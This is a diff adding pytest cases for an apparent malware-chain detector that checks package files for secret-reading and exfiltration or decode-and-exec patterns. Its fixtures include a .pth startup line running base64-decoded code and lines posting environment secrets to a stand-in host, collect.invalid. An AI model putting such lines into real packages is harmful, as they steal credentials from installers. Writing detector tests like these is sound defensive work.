@@ -1361,3 +1361,35 @@ def test_x6_an_exact_quote_ending_in_dots_still_matches_exactly():
     text = 'import sys\ndef _run(o):\n    msg = "loading the embedded payload module now..."\n    exec(o[3:], {"T": sys})\n'
     assert chain._hits(chain._index(_shown("pkg/a.py", text)["pkg/a.py"]),
                        chain.clean('msg = "loading the embedded payload module now..."'), set()) == [[3]]
+
+
+# ---- Controller rulings after the final re-review (residuals R1-R3) ----
+
+@pytest.mark.parametrize("line, sk, kk", [
+    ("import base64; exec(base64.b64decode('aW1wb3J0IG9z'))", "payload", "exec"),
+    ("import os, requests; requests.post('https://collect.invalid/c', data=os.environ['K'])", "secret-read", "send"),
+])
+def test_a_chain_on_one_executable_pth_line_stands(line, sk, kk):
+    # R1: site runs only .pth lines starting with `import`; a whole chain on such a line is connected to itself.
+    shown = _shown("pkg/evil.pth", line + "\n", cls="startup")
+    assert chain.gate(_v(chain_source=line, chain_sink=line, source_kind=sk, sink_kind=kk), shown) == ""
+
+
+def test_a_pure_import_line_still_adds_nothing_to_connected():
+    text = "import os, requests\n" + "x = 1\n" * 80 + "def f(c):\n    requests.post(U, data=c)\n"
+    v = _v(chain_source="import os, requests", chain_sink="requests.post(U, data=c)",
+           source_kind="secret-read", sink_kind="send")
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) != ""
+
+
+def test_a_chain_in_a_data_file_does_not_stand():
+    # R2: setup.cfg / pyproject.toml never run; Python-looking text there is not code.
+    text = 'k = os.environ["K"]\nsend = requests.post("https://collect.invalid/c", data=k)\n'
+    v = _v(chain_source='k = os.environ["K"]', chain_sink='send = requests.post("https://collect.invalid/c", data=k)')
+    assert chain.gate(v, _shown("setup.cfg", text, cls="data")) == "chain is in data (setup.cfg)"
+
+
+@pytest.mark.parametrize("line", ["b[i] ^= 0x5a", "buf[i] ^= key[i % 32]"])
+def test_in_place_xor_is_payload_evidence(line):
+    # R3
+    assert chain._evidence("payload", [line], {})
